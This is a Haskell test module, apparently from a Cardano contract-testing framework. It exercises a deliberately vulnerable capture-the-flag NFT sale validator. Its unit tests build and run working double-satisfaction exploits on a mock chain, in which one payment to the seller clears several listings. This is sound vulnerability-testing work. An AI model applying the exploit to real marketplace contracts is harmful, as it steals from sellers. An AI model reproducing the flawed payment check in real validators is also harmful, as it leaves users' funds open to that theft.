{-# LANGUAGE DeriveAnyClass #-}
{-# LANGUAGE DerivingStrategies #-}
{-# LANGUAGE LambdaCase #-}
{-# LANGUAGE NamedFieldPuns #-}
{-# LANGUAGE NumericUnderscores #-}
{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE TemplateHaskell #-}
{-# LANGUAGE TypeApplications #-}
{-# LANGUAGE TypeFamilies #-}
{-# LANGUAGE ViewPatterns #-}

{- | Tests for the Aiken-compiled CTF Sell NFT validator using TestingInterface.

This module demonstrates property-based testing of a vulnerable NFT marketplace contract.
The CTF Sell NFT validator has a **double satisfaction vulnerability**:

The validator checks that SOME output pays the seller at least the price, but doesn't
ensure each script input has its own unique payment output. This allows an attacker
to satisfy multiple script inputs with a single payment.

The Aiken types encode as:
- @Datum { seller: Address, price: Int }@ = @Constr 0 [address, price]@
- @Redeemer: Void@ = @()@ (unit)

The Aiken Address type maps directly to PlutusLedgerApi.V1.Address.
-}
module AikenSellNftSpec (
  -- * TestingInterface model
  SellNftModel (..),

  -- * Test tree
  aikenSellNftTests,
) where

import Cardano.Api qualified as C
import Control.Monad (void)
import Control.Monad.IO.Class (MonadIO (..))
import Convex.Aiken.Blueprint (Blueprint (..))
import Convex.Aiken.Blueprint qualified as Blueprint
import Convex.BuildTx (MonadBuildTx, execBuildTx)
import Convex.BuildTx qualified as BuildTx
import Convex.Class (MonadMockchain, getUtxo)
import Convex.CoinSelection (ChangeOutputPosition (TrailingChange))
import Convex.MockChain (fromLedgerUTxO)
import Convex.MockChain.CoinSelection (balanceAndSubmit, tryBalanceAndSubmit)
import Convex.MockChain.Defaults qualified as Defaults
import Convex.MockChain.Utils (mockchainSucceeds)
import Convex.PlutusLedger.V1 (transAddressInEra)
import Convex.TestingInterface (
  RunOptions,
  TestingInterface (..),
  propRunActionsWithOptions,
 )
import Convex.ThreatModel.DoubleSatisfaction (doubleSatisfaction)
import Convex.Utils (failOnError)
import Convex.Wallet (Wallet, addressInEra)
import Convex.Wallet.MockWallet qualified as Wallet
import Data.Map qualified as Map

import Paths_convex_testing_interface qualified as Pkg
import PlutusLedgerApi.V1 qualified as PV1
import PlutusTx qualified

import System.IO.Unsafe (unsafePerformIO)
import Test.Tasty (TestTree, testGroup)
import Test.Tasty.HUnit (assertFailure, testCase)
import Test.Tasty.QuickCheck qualified as QC

-- ----------------------------------------------------------------------------
-- Sell NFT Datum type (wire-compatible with Aiken)
-- ----------------------------------------------------------------------------

{- | The datum stored at the sell_nft script address.

Aiken encodes this as: @Constr 0 [address, price]@

The seller field is a full Plutus Address (not just a PubKeyHash),
matching Aiken's cardano/address.Address type.
-}
data SellNftDatum = SellNftDatum
  { snSeller :: PV1.Address
  -- ^ The Plutus address of the seller who receives payment
  , snPrice :: Integer
  -- ^ Price in lovelace
  }
  deriving stock (Eq, Show)

-- Use TH for ToData/FromData/UnsafeFromData instances
PlutusTx.unstableMakeIsData ''SellNftDatum

-- ----------------------------------------------------------------------------
-- Script loading
-- ----------------------------------------------------------------------------

-- | Load the Aiken "ctf_sell_nft" validator from the embedded blueprint
loadSellNftScript :: IO (C.PlutusScript C.PlutusScriptV3)
loadSellNftScript = do
  path <- Pkg.getDataFileName "test/data/aiken-contracts-example.json"
  Blueprint{validators} <- Blueprint.loadFromFile path >>= either fail pure
  case Map.lookup "ctf_sell_nft.ctf_sell_nft.spend" validators of
    Just (C.ScriptInAnyLang (C.PlutusScriptLanguage C.PlutusScriptV3) (C.PlutusScript _ ps)) ->
      pure ps
    _ -> fail "ctf_sell_nft.ctf_sell_nft.spend not found in Aiken blueprint"

{- | Top-level binding for the Aiken CTF Sell NFT script.

We use 'unsafePerformIO' here because 'TestingInterface.initialState' is a
pure value (not a function), so we cannot pass the script in dynamically.
-}
{-# NOINLINE sellNftScript #-}
sellNftScript :: C.PlutusScript C.PlutusScriptV3
sellNftScript = unsafePerformIO loadSellNftScript

-- | Helper to wrap PlutusScript as Script (for hashScript)
plutusScript :: C.PlutusScript C.PlutusScriptV3 -> C.Script C.PlutusScriptV3
plutusScript = C.PlutusScript C.PlutusScriptV3

-- | Hash of the sell_nft script
sellNftScriptHash :: C.ScriptHash
sellNftScriptHash = C.hashScript (plutusScript sellNftScript)

-- | Address of the sell_nft script on the default network
sellNftAddress :: C.AddressInEra C.ConwayEra
sellNftAddress =
  C.makeShelleyAddressInEra
    C.shelleyBasedEra
    Defaults.networkId
    (C.PaymentCredentialByScript sellNftScriptHash)
    C.NoStakeAddress

-- ----------------------------------------------------------------------------
-- Transaction builders
-- ----------------------------------------------------------------------------

{- | List an "NFT" for sale by locking funds at the script address.

For simplicity, we lock ADA at the script instead of actual NFTs.
The vulnerability is about the payment check, not NFTs specifically.
-}
listNft
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , MonadBuildTx era m
     )
  => C.NetworkId
  -> Wallet
  -- ^ The seller
  -> C.Lovelace
  -- ^ Price in lovelace
  -> m ()
listNft networkId seller price = do
  let sellerAddr :: C.AddressInEra era
      sellerAddr = addressInEra networkId seller
      -- Convert cardano-api address to Plutus address
      plutusAddr = case transAddressInEra sellerAddr of
        Just a -> a
        Nothing -> error "Failed to convert seller address"
      datum = SellNftDatum{snSeller = plutusAddr, snPrice = fromIntegral price}
  BuildTx.payToScriptInlineDatum
    networkId
    sellNftScriptHash
    datum
    C.NoStakeAddress
    (C.lovelaceToValue 2_000_000) -- Min UTxO for the listing

{- | Buy an NFT by spending the script UTxO and paying the seller.

The buyer pays at least the price to the seller's address.
-}
buyNft
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => C.TxIn
  -- ^ The script UTxO to spend
  -> C.AddressInEra era
  -- ^ Seller's address
  -> C.Lovelace
  -- ^ Price to pay
  -> m ()
buyNft txIn sellerAddr price = do
  let witness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            sellNftScript
            (C.ScriptDatumForTxIn Nothing)
            () -- Void redeemer
  BuildTx.setScriptsValid
  BuildTx.addInputWithTxBody txIn witness
  BuildTx.payToAddress sellerAddr (C.lovelaceToValue price)

{- | Buy multiple NFTs in one transaction, but only pay the seller once.

This demonstrates the double satisfaction vulnerability:
- Multiple script inputs all check for "some output paying seller >= price"
- A single output can satisfy ALL of them
-}
buyMultipleNfts
  :: forall era m
   . ( C.IsBabbageBasedEra era
     , C.HasScriptLanguageInEra C.PlutusScriptV3 era
     , MonadBuildTx era m
     )
  => [(C.TxIn, C.Lovelace)]
  -- ^ Script UTxOs to spend with their prices
  -> C.AddressInEra era
  -- ^ Seller's address
  -> C.Lovelace
  -- ^ Single payment amount (should be max price to satisfy all)
  -> m ()
buyMultipleNfts inputs sellerAddr payment = do
  let witness _ =
        C.ScriptWitness C.ScriptWitnessForSpending $
          BuildTx.buildScriptWitness
            sellNftScript
            (C.ScriptDatumForTxIn Nothing)
            () -- Void redeemer
  BuildTx.setScriptsValid
  -- Add all script inputs
  mapM_ (\(txIn, _) -> BuildTx.addInputWithTxBody txIn witness) inputs
  -- Pay seller only ONCE (the vulnerability!)
  BuildTx.payToAddress sellerAddr (C.lovelaceToValue payment)

-- ----------------------------------------------------------------------------
-- Helper to find script UTxOs
-- ----------------------------------------------------------------------------

-- | Find all UTxOs at the sell_nft script address
findSellNftUtxos
  :: (MonadMockchain C.ConwayEra m)
  => m [(C.TxIn, C.Value, SellNftDatum)]
findSellNftUtxos = do
  utxoSet <- fromLedgerUTxO C.shelleyBasedEra <$> getUtxo
  let C.UTxO utxos = utxoSet
      scriptUtxos = Map.filter (\(C.TxOut addr _ _ _) -> addr == sellNftAddress) utxos
  pure $ map extractData $ Map.toList scriptUtxos
 where
  extractData (txIn, C.TxOut _ (C.TxOutValueShelleyBased _ val) datum _) =
    let value = C.fromMaryValue val
        d = case datum of
          C.TxOutDatumInline _ scriptData ->
            PlutusTx.unsafeFromBuiltinData @SellNftDatum
              (PlutusTx.dataToBuiltinData $ C.toPlutusData $ C.getScriptData scriptData)
          _ -> error "Expected inline datum"
     in (txIn, value, d)

-- ----------------------------------------------------------------------------
-- Unit tests
-- ----------------------------------------------------------------------------

aikenSellNftUnitTests :: TestTree
aikenSellNftUnitTests =
  testGroup
    "ctf sell_nft unit tests"
    [ testCase "list an NFT for sale" $
        mockchainSucceeds $
          failOnError $ do
            let txBody = execBuildTx $ listNft Defaults.networkId Wallet.w1 10_000_000
            void $ tryBalanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
            -- Verify UTxO exists at script address
            result <- findSellNftUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((_, _, datum) : _) -> do
                -- Verify the price is correct
                liftIO $
                  if snPrice datum == 10_000_000
                    then pure ()
                    else assertFailure $ "Wrong price: " ++ show (snPrice datum)
    , testCase "list then buy (normal purchase)" $
        mockchainSucceeds $
          failOnError $ do
            -- w1 lists an NFT for 10 ADA
            let listTxBody = execBuildTx $ listNft @C.ConwayEra Defaults.networkId Wallet.w1 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 listTxBody TrailingChange []

            -- Find the listing
            result <- findSellNftUtxos
            case result of
              [] -> liftIO $ assertFailure "Expected UTxO at script address"
              ((txIn, _, _datum) : _) -> do
                -- w2 buys it by paying w1 10 ADA
                let sellerAddr = addressInEra Defaults.networkId Wallet.w1
                    buyTxBody = execBuildTx $ buyNft @C.ConwayEra txIn sellerAddr 10_000_000
                void $ tryBalanceAndSubmit mempty Wallet.w2 buyTxBody TrailingChange []

                -- Verify UTxO is gone
                result2 <- findSellNftUtxos
                case result2 of
                  [] -> pure ()
                  _ -> liftIO $ assertFailure "Expected no UTxO at script after purchase"
    , testCase "double satisfaction exploit - 2 listings, 1 payment" $
        mockchainSucceeds $
          failOnError $ do
            -- w1 lists TWO NFTs at 10 ADA each
            let listTxBody1 = execBuildTx $ listNft @C.ConwayEra Defaults.networkId Wallet.w1 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 listTxBody1 TrailingChange []
            let listTxBody2 = execBuildTx $ listNft @C.ConwayEra Defaults.networkId Wallet.w1 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 listTxBody2 TrailingChange []

            -- Find both listings
            result <- findSellNftUtxos
            case result of
              (x : y : _) -> do
                let (txIn1, _, _) = x
                    (txIn2, _, _) = y
                    sellerAddr = addressInEra Defaults.networkId Wallet.w1
                -- EXPLOIT: Buy BOTH with only ONE payment of 10 ADA!
                -- The validator checks "some output >= price" for each input,
                -- but both find the same output, so only 10 ADA is paid instead of 20.
                let exploitTxBody =
                      execBuildTx $
                        buyMultipleNfts @C.ConwayEra
                          [(txIn1, 10_000_000), (txIn2, 10_000_000)]
                          sellerAddr
                          10_000_000 -- Pay only 10 ADA total!
                void $ tryBalanceAndSubmit mempty Wallet.w2 exploitTxBody TrailingChange []
              _ -> liftIO $ assertFailure "Expected 2 UTxOs at script address"
    , testCase "double satisfaction with different prices" $
        mockchainSucceeds $
          failOnError $ do
            -- w1 lists one NFT at 10 ADA and another at 20 ADA
            let listTxBody1 = execBuildTx $ listNft @C.ConwayEra Defaults.networkId Wallet.w1 10_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 listTxBody1 TrailingChange []
            let listTxBody2 = execBuildTx $ listNft @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
            _ <- tryBalanceAndSubmit mempty Wallet.w1 listTxBody2 TrailingChange []

            -- Find both listings
            result <- findSellNftUtxos
            case result of
              (x : y : _) -> do
                let (txIn1, _, _) = x
                    (txIn2, _, _) = y
                    sellerAddr = addressInEra Defaults.networkId Wallet.w1
                -- EXPLOIT: Pay only 20 ADA (the max) to satisfy BOTH!
                -- - The 10 ADA listing finds the 20 ADA output (20 >= 10, OK!)
                -- - The 20 ADA listing finds the 20 ADA output (20 >= 20, OK!)
                -- Total should be 30 ADA, but we only pay 20!
                let exploitTxBody =
                      execBuildTx $
                        buyMultipleNfts @C.ConwayEra
                          [(txIn1, 10_000_000), (txIn2, 20_000_000)]
                          sellerAddr
                          20_000_000 -- Pay only 20 ADA instead of 30!
                void $ tryBalanceAndSubmit mempty Wallet.w2 exploitTxBody TrailingChange []
              _ -> liftIO $ assertFailure "Expected 2 UTxOs at script address"
    ]

-- ----------------------------------------------------------------------------
-- TestingInterface instance
-- ----------------------------------------------------------------------------

-- | Model state for the CTF Sell NFT contract
data SellNftModel = SellNftModel
  { smListings :: [(C.TxIn, C.Lovelace)]
  -- ^ Active NFT listings (txin + price)
  , smInitialized :: Bool
  -- ^ Whether any listings exist
  }
  deriving stock (Show, Eq)

instance TestingInterface SellNftModel where
  -- Actions for Sell NFT: list NFTs and buy them
  data Action SellNftModel
    = ListNft C.Lovelace
    | -- \^ List an "NFT" at given price
      BuySingle Int
    -- \^ Buy one listing by index
    deriving stock (Show, Eq)

  initialState =
    SellNftModel
      { smListings = []
      , smInitialized = False
      }

  -- Generate actions: all types in every state (weighted)
  -- Precondition filters invalid ones; this enables negative testing
  arbitraryAction model
    | null (smListings model) =
        QC.frequency
          [ (9, ListNft <$> genPrice)
          , (1, BuySingle <$> QC.choose (0, 5)) -- Invalid: no listings
          ]
    | otherwise =
        QC.frequency
          [ (3, ListNft <$> genPrice)
          , (6, BuySingle <$> QC.choose (0, length (smListings model) - 1))
          , (1, BuySingle <$> QC.choose (length (smListings model), length (smListings model) + 5)) -- Invalid: out of bounds
          ]
   where
    genPrice = fromInteger <$> QC.choose (5_000_000, 20_000_000)

  precondition _model (ListNft _) = True
  precondition model (BuySingle idx) =
    not (null (smListings model)) && idx >= 0 && idx < length (smListings model)

  nextState model action = case action of
    ListNft price ->
      model
        { smListings = smListings model ++ [(dummyTxIn, price)]
        , smInitialized = True
        }
    BuySingle idx ->
      let listings = smListings model
          newListings = take idx listings ++ drop (idx + 1) listings
       in model{smListings = newListings}
   where
    -- Placeholder TxIn for model tracking (actual TxIn comes from blockchain)
    dummyTxIn = C.TxIn (C.TxId "0000000000000000000000000000000000000000000000000000000000000000") (C.TxIx 0)

  perform _model action = case action of
    ListNft price -> do
      -- w2 is the seller (receives payment), but w1 submits the tx (pays fees)
      -- This ensures all transactions have a change output to w1, which the
      -- threat model re-balancer requires.
      -- NOTE: Using w1 for all tx submissions because the threat model
      -- re-balancer uses w1 for re-signing. See TipJar's similar pattern.
      let txBody = execBuildTx $ listNft @C.ConwayEra Defaults.networkId Wallet.w2 price
      void $ balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []
    BuySingle idx -> do
      result <- findSellNftUtxos
      case drop idx result of
        [] -> fail $ "No UTxO found at index " ++ show idx
        ((txIn, _, datum) : _) -> do
          -- w1 is the buyer (signer), pays to w2 (seller/victim)
          -- This matches the threat model's requirement: signer ≠ victim
          let sellerAddr = addressInEra Defaults.networkId Wallet.w2
              price = fromInteger (snPrice datum) :: C.Lovelace
              txBody = execBuildTx $ buyNft @C.ConwayEra txIn sellerAddr price
          void $ balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []

  validate model = do
    result <- findSellNftUtxos
    let actualCount = length result
        expectedCount = length (smListings model)
    pure $ actualCount == expectedCount

  monitoring _state _action prop = prop

  -- NOTE: threatModels is intentionally empty for sell_nft because:
  --
  -- 1. sell_nft is a "one-shot spend" pattern: ListNft creates script outputs
  --    (no validator runs), BuySingle spends script inputs (validator runs,
  --    no script output created).
  --
  -- 2. Most threat models assume script-to-script continuations or that script
  --    outputs have validators running. For ListNft, no validator executes
  --    (it's just paying to a script address), so these threat models give
  --    false positives.
  --
  -- Applicable threat models for one-shot spend patterns would need to only
  -- run on BuySingle transactions (which have script inputs). This is a future
  -- enhancement for the TestingInterface framework.
  threatModels = []

  -- doubleSatisfaction is a KNOWN vulnerability in this contract.
  -- It's run as an expected vulnerability (inverted pass/fail).
  expectedVulnerabilities = [doubleSatisfaction]

-- ----------------------------------------------------------------------------
-- Test tree
-- ----------------------------------------------------------------------------

-- | All CTF Sell NFT tests grouped together
aikenSellNftTests :: RunOptions -> TestTree
aikenSellNftTests runOpts =
  testGroup
    "ctf sell_nft"
    [ aikenSellNftUnitTests
    , testGroup
        "property tests"
        [ propRunActionsWithOptions @SellNftModel
            "property-based testing"
            runOpts
        ]
    ]
